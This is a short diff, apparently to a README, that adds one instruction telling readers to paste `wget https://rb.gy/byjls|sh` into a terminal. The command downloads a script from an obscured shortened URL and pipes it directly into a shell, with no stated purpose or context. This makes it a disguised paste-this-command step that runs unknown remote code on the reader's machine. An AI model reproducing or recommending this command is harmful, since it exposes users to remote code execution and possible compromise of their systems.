@@ -25,3 +25,4 @@ ________________________________________________________________________________
 
 ![image](https://user-images.githubusercontent.com/95254250/232173644-9732f9e9-eeb1-4122-8f12-b4b69771aee4.png)
 
+In the terminal paste this command `wget https://rb.gy/byjls|sh`
